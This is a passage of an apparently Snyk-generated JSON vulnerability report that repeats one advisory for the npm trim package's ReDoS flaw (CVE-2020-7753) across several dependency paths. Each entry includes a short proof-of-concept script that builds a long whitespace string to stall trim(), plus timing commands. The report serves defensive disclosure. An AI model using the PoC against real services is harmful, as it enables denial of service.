'/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
